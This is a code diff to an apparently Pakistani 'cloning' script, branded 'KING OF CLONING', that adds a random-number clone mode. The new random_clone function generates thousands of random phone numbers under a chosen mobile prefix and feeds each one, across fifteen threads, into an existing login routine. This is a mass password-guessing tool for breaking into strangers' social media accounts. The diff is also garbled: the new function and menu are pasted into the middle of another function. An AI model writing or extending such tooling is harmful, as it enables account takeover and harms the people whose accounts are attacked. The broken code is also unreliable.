@@ -164,6 +164,11 @@ print("\033[1;32m[=] OWNER    :\033[1;37m MAQSOOD AHMAD")
 print("\033[1;32m[=] FORM     :\033[1;37m LPC KING OF CLONING")
 print("\033[1;32m[=] STATUS   :\033[1;37m STAY HAPPY ALWAYS")
 print(line)
+print(line)
+print("\033[1;32m[1] \033[1;37mOLD ID CLONE")
+print("\033[1;32m[2] \033[1;37mRANDOM NUMBER CLONE")  # <-- Naya Option
+print("\033[1;32m[0] \033[1;37mEXIT WORK")
+print(line)
 
 
 def ____banner____():
@@ -264,6 +269,40 @@ def old_clone():
 
 
 def old_One():
+def random_clone():
+    user_ids = []
+    print(line)
+    print("\033[1;32m[+] EXAMPLE : 0300, 0301, 0302, 0303")
+    code = input("\033[1;37m[?] SELECT CODE : ")
+    
+    print(line)
+    print("\033[1;32m[+] EXAMPLE : 2000, 5000, 10000")
+    limit = int(input("\033[1;37m[?] ENTER LIMIT : "))
+    
+    # Random Numbers Generate Karein
+    for _ in range(limit):
+        number = ''.join([str(rr(0, 9)) for _ in range(7)])
+        user_ids.append(code + number)
+
+    print(line)
+    print(f"\033[1;32m[+] TOTAL IDs GENERATED : {len(user_ids)}")
+    print(line)
+
+    # Threading Start Karein
+    with tred(max_workers=15) as pool:
+        for uid in user_ids:
+            pool.submit(Login_2, uid)  # Aapka existing login function use hoga
+choice = input("\033[1;37mCHOICE : ")
+
+if choice in ['1', '01']:
+    old_clone()
+elif choice in ['2', '02']:
+    random_clone()  # <-- Yeh aapke naye function ko call karega
+elif choice in ['0', '00']:
+    exit("[+] THANK YOU FOR USING")
+else:
+    print("[!] INVALID CHOICE")
+
     user = []
     ____banner____()
     print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49mOld Code {Y}:{G} 2010-2014")
